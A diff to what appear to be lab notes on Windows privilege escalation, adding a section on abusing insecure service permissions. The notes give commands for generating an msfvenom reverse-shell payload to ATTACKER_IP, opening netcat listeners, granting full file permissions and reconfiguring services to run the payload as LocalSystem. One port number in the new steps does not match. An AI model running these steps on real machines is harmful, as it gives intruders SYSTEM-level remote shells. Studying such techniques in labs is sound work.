@@ -46,7 +46,7 @@ via AlwaysInstallElevated
 3. (Target machine) C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 
 
-via Insecure Permissions on Service Executable (vulnerability found on Splinterware System Scheduler)
+via Windows Services: Insecure Permissions on Service Executable (vulnerability found on Splinterware System Scheduler)
 
 1. sc qc WindowsScheduler to check path name and service start name
 2. icacls C:\PROGRA~2\SYSTEM~1\WService.exe check permissions
@@ -62,7 +62,7 @@ via Insecure Permissions on Service Executable (vulnerability found on Splinterw
 12. this should spin up the reverse shell
 
 
-via Unquoted Service Paths
+via Windows Services: Unquoted Service Paths
 
 1. sc qc "<associated binary>" and check the SERVICE_START_NAME
 2. icacls c:\<PATH_TO_THE_ASSOCIATED_BINARY>, and check if the unprivilege user has AD and WD access
@@ -73,5 +73,14 @@ via Unquoted Service Paths
 7. icacls C:\MyPrograms\Disk.exe /grant Everyone:F
 8. (Attacker Machine) nc -nlvp 4446 to start listener
 9. sc stop "disk sorter enterprise" and sc start "disk sorter enterprise" to run the payload
+
+via Windows Services: Insecure Service Permissions
+
+1. C:\tools\AccessChk> accesschk64.exe -qlc thmservice and check the user in the ACCESS_ALLOWED_ACE_TYPE
+2. (Attacker Machine) msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe to generate the payload
+3. (Attacker Machine) nc -nlvp 4446 to start the lister
+4. C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+5. C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem to change the executable
+6. C:\> sc stop THMService and C:\> sc start THMService to run the payload
 
 
